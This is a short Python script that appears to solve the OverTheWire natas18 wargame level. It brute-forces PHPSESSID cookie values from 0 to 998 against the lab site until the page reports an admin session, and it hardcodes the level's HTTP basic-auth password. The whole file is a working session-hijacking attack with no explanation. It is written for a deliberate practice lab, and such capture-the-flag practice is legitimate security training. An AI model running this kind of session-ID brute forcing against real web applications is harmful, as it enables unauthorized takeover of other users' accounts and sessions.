#!/bin/python

import requests

url = "http://natas18.natas.labs.overthewire.org/"
auth_username = "natas18"
auth_password = "xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP"
exist_str = "You are an admin."
for i in range(0,999):
    params = dict(username='admin',password='hoge')
    cookies = dict(PHPSESSID=str(i))
    r = requests.get(url, auth=(auth_username,auth_password), cookies=cookies, params=params)
    print(f"Now charange number is [{i}]")
    if exist_str in r.text:
        print(f"[+] admin cookie is [{i}]")
        break
print(r.text)